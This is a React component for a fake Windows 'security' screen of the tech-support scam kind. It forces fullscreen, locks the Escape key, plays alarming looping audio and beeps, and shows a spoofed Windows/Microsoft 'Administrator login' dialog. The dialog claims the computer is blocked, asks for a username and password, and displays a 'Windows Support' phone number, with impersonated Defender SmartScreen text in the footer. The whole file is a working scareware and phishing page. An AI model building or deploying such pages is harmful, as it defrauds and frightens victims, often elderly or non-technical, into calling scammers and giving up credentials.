import { useState, useEffect } from 'react';
import '../../assets/css/microsoft.css';
import { FaBell, FaCog, FaQuestionCircle } from 'react-icons/fa';
import SecondContainer from "../../assets/components/second-container";
import ThirdContainer from "../../assets/components/third-container";

function Microsoft() {
    const [showLogin, setShowLogin] = useState(true);
    const [escHoldStart, setEscHoldStart] = useState<number | null>(null);
    const HOLD_DURATION = 3000;

    const requestKeyboardLock = async () => {
        if ('keyboard' in navigator) {
            try {
                await (navigator as any).keyboard.lock(['Escape']);
            } catch (err) { }
        }
    };

    const unlockKeyboard = () => {
        if ('keyboard' in navigator) {
            (navigator as any).keyboard.unlock();
        }
    };

    useEffect(() => {
        let isMounted = true;

        const enterFullScreen = async () => {
            const elem = document.documentElement;
            try {
                await elem.requestFullscreen();
                if (isMounted) await requestKeyboardLock();
            } catch (err) {
                Object.assign(document.documentElement.style, {
                    position: 'fixed',
                    inset: '0',
                    width: '100vw',
                    height: '100vh',
                    overflow: 'hidden',
                    zIndex: '9999',
                });
            }
        };

        enterFullScreen();

        const handleFullscreenChange = () => {
            if (!document.fullscreenElement) {
                unlockKeyboard();
            } else if (isMounted) {
                requestKeyboardLock();
            }
        };

        document.addEventListener('fullscreenchange', handleFullscreenChange);

        return () => {
            isMounted = false;
            unlockKeyboard();
            document.removeEventListener('fullscreenchange', handleFullscreenChange);
            if (document.fullscreenElement) {
                document.exitFullscreen().catch(() => { });
            }
        };
    }, []);

    useEffect(() => {
        const handleKeyDown = (e: KeyboardEvent) => {
            if (e.key === 'Escape') {
                e.preventDefault();
                if (escHoldStart === null) {
                    setEscHoldStart(Date.now());
                }
            }
        };

        const handleKeyUp = (e: KeyboardEvent) => {
            if (e.key === 'Escape' && escHoldStart !== null) {
                const held = Date.now() - escHoldStart;
                if (held >= HOLD_DURATION) {
                    setShowLogin(false);
                }
                setEscHoldStart(null);
            }
        };

        window.addEventListener('keydown', handleKeyDown, { capture: true });
        window.addEventListener('keyup', handleKeyUp, { capture: true });

        return () => {
            window.removeEventListener('keydown', handleKeyDown, { capture: true });
            window.removeEventListener('keyup', handleKeyUp, { capture: true });
        };
    }, [escHoldStart]);
    useEffect(() => {
        const secondAudio = new Audio("/microsoft/censor-beep-2.mp3");
        const playAudio = () => {
            secondAudio.currentTime = 0; 
            secondAudio.play().catch(() => { }); 
        };

        const interval = setInterval(playAudio, 5000);

        return () => {
            clearInterval(interval);
            secondAudio.pause();
        };
    }, []);

    return (
        <div className="fake-desktop">
            <audio src="/microsoft/generated-audio.mp3" autoPlay loop />

            <div className="left-container">
                <div className="top-right-toolbar">
                    <div className="window-buttons">
                        <button className="window-btn">−</button>
                        <button className="window-btn">□</button>
                        <button className="window-btn close-btn">×</button>
                    </div>

                    <div className="extra-buttons">
                        <button className="redeem-button">Redeem license code</button>

                        <button className="extra-btn">
                            <FaBell />
                        </button>
                        <button className="extra-btn">
                            <FaCog />
                        </button>
                        <button className="extra-btn">
                            <FaQuestionCircle />
                        </button>
                    </div>
                </div>

                <div className="sidebar-content">
                    <p>Left sidebar content</p>
                </div>
            </div>

            <SecondContainer />
            <ThirdContainer />

            <footer className="page-footer">
                <div className="footer-top">
                    <img src="/microsoft/logo.webp" alt="Windows Logo" className="footer-logo" />
                    <span>Windows Security</span>
                    <span>Microsoft Support</span>
                    <span className="footer-phone">020 4549 4912</span>
                </div>
                <div className="footer-marquee">
                    <div className="marquee-content">
                        <span>
                            Defender SmartScreen now prevents unrecognized apps from appearing. Running this tool could put your Computer at risk. Windows analyzes all apps to help protect you.  &nbsp;
                        </span>
                        <span>
                            Defender SmartScreen now prevents unrecognized apps from appearing. Running this tool could put your Computer at risk. Windows analyzes all apps to help protect you.  &nbsp;
                        </span>
                    </div>
                </div>
            </footer>

            {showLogin && (
                <div className="login-overlay" onClick={() => setShowLogin(false)}>
                    <div className="login-dialog" onClick={e => e.stopPropagation()}>
                        <div className="dialog-title-bar">
                            <button className="close" onClick={() => setShowLogin(false)}>×</button>
                        </div>
                        <div className="dialog-body">
                            <span style={{ fontSize: "28px", fontFamily: "Segoe UI" }}>Administrator login</span>
                            <p style={{ marginTop: "20px" }}>
                                Windows has been blocked due to suspicious activity.
                                Try logging in again with your Windows account and password.
                                If you need help, contact Windows Support.
                            </p>
                            <div className="phone-large">020 4549 4912</div>
                            <div className="form">
                                <input type="text" placeholder="Username" />
                                <input type="password" placeholder="Password" />
                                <button className="login-button">Login</button>
                            </div>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
}

export default Microsoft;